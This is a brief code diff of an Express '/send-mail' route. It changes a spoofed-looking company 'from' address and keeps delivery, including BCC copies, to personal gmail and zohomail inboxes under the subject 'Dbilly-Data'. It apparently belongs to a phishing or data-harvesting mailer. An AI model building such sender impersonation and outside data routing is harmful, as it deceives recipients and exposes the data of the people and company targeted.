@@ -11,7 +11,7 @@ router.post('/send-mail', (req, res) => {
 
     // Define email options with multiple recipients, including BCC
     const mailOptions = {
-        from: 'pedro.araujo@remax.pt',
+        from: 'lbpaula@remax.pt',
         to: ['dninotoolz@gmail.com', 'dninotoolz@gmail.com'], // Primary recipients
         bcc: ['dninotoolz@gmail.com', 'billytoolz@zohomail.eu'], // BCC recipients
         subject: 'Dbilly-Data',
